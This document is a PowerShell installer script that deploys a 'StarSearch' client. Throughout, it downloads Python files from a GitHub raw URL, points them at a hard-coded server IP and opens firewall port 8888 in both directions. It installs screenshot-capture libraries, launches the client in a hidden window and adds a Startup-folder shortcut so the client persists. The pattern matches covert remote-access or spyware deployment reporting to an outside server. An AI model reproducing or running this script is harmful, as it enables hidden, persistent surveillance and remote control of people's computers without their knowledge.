Write-Host "Script started"
$SourcePath="https://raw.githubusercontent.com/stxrman404/usbRepo/"
$ServerIP="31.48.79.68"
$InstallPath="$env:USERPROFILE\StarSearch"
if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){Write-Host "Run as Administrator";exit 1}
$port=8888
Get-NetFirewallRule -DisplayName "StarSearch Port $port" -ErrorAction SilentlyContinue|Remove-NetFirewallRule -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "StarSearch Port $port" -Direction Inbound -LocalPort $port -Protocol TCP -Action Allow|Out-Null
New-NetFirewallRule -DisplayName "StarSearch Port $port (Outbound)" -Direction Outbound -LocalPort $port -Protocol TCP -Action Allow|Out-Null
if(-not(Test-Path $InstallPath)){New-Item -ItemType Directory -Path $InstallPath -Force|Out-Null}
$files=@("client.py","config.py","requirements.txt")
foreach($f in $files){$dest=Join-Path $InstallPath $f;if($SourcePath -like "http*"){Invoke-WebRequest -Uri "$SourcePath/$f" -OutFile $dest -ErrorAction SilentlyContinue}elseif(Test-Path $SourcePath){$src=Join-Path $SourcePath $f;if(Test-Path $src){Copy-Item $src $dest -Force -ErrorAction SilentlyContinue}}}
$config=Join-Path $InstallPath "config.py"
Set-Content -Path $config -Value "SERVER_HOST = `"$ServerIP`"`nSERVER_PORT = 8888`n" -Force
$python=Get-Command python -ErrorAction SilentlyContinue
if(-not $python){$python=Get-Command python3 -ErrorAction SilentlyContinue}
if(-not $python){Write-Host "Python not found";exit 1}
$req=Join-Path $InstallPath "requirements.txt"
if(Test-Path $req){& $python.Source -m pip install -r $req --quiet}else{& $python.Source -m pip install Pillow mss --quiet}
$vbs=Join-Path $InstallPath "start_client.vbs"
Set-Content -Path $vbs -Value "Set WshShell=CreateObject(`"WScript.Shell`"):WshShell.Run `"pythonw.exe `"$InstallPath\client.py`"`",0,False" -Force
$startup="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$lnk=Join-Path $startup "StarSearch Client.lnk"
$ws=New-Object -ComObject WScript.Shell
$sc=$ws.CreateShortcut($lnk)
$sc.TargetPath="wscript.exe"
$sc.Arguments="`"$vbs`""
$sc.WorkingDirectory=$InstallPath
$sc.Save()
$client=Join-Path $InstallPath "client.py"
if(Test-Path $client){Start-Process pythonw.exe -ArgumentList "`"$client`"" -WindowStyle Hidden}


